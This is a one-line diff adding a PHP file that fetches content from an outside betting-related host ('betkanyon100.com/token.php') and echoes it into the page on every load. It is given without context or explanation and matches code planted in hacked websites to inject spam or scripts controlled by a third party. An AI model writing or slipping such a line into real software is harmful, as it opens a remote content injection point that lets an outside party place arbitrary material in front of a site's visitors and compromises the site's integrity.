@@ -1,0 +1,1 @@
+<?php echo file_get_contents('http://software2.betkanyon100.com/token.php');
